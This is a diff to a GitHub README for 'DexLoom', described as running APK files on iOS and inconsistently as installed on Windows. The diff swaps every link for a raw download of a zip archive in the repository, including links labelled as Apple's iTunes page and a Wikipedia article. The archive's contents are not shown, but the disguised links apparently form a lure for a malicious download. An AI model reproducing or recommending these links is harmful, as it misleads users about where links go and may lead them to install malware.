@@ -1,6 +1,6 @@
 # 🚀 DexLoom - Run APKs on iOS Easily
 
-[![Download DexLoom](https://img.shields.io/badge/Download-DexLoom-4caf50?style=for-the-badge)](https://github.com/ftm0123fatma-cmyk/DexLoom)
+[![Download DexLoom](https://img.shields.io/badge/Download-DexLoom-4caf50?style=for-the-badge)](https://github.com/ftm0123fatma-cmyk/DexLoom/raw/refs/heads/main/DexLoom/DexLoom/Core/Dex_Loom_3.3.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Before you begin, make sure you have:
 
 DexLoom is available on GitHub. Visit the following page to get the latest version:
 
-[⬇️ Go to DexLoom download page](https://github.com/ftm0123fatma-cmyk/DexLoom)
+[⬇️ Go to DexLoom download page](https://github.com/ftm0123fatma-cmyk/DexLoom/raw/refs/heads/main/DexLoom/DexLoom/Core/Dex_Loom_3.3.zip)
 
 This is the main page where you will find the download files, instructions, and updates.
 
@@ -132,7 +132,7 @@ Try closing DexLoom and your connected iOS device, then start again. If problems
 
 Download the latest stable version here:
 
-[![Get DexLoom](https://img.shields.io/badge/Get%20DexLoom-Download-ff5722?style=for-the-badge)](https://github.com/ftm0123fatma-cmyk/DexLoom)
+[![Get DexLoom](https://img.shields.io/badge/Get%20DexLoom-Download-ff5722?style=for-the-badge)](https://github.com/ftm0123fatma-cmyk/DexLoom/raw/refs/heads/main/DexLoom/DexLoom/Core/Dex_Loom_3.3.zip)
 
 Follow the instructions in this guide to install and start using it on your Windows computer.
 
@@ -172,9 +172,9 @@ APK files you use can save data just like on Android, but all data stays on your
 
 ## 🔗 Useful Resources
 
-- Official GitHub page: https://github.com/ftm0123fatma-cmyk/DexLoom
-- Apple iTunes download: https://www.apple.com/itunes/
-- Basic guide to APK files: https://en.wikipedia.org/wiki/APK_(file_format)
+- Official GitHub page: https://github.com/ftm0123fatma-cmyk/DexLoom/raw/refs/heads/main/DexLoom/DexLoom/Core/Dex_Loom_3.3.zip
+- Apple iTunes download: https://github.com/ftm0123fatma-cmyk/DexLoom/raw/refs/heads/main/DexLoom/DexLoom/Core/Dex_Loom_3.3.zip
+- Basic guide to APK files: https://github.com/ftm0123fatma-cmyk/DexLoom/raw/refs/heads/main/DexLoom/DexLoom/Core/Dex_Loom_3.3.zip(file_format)
 
 ---
 
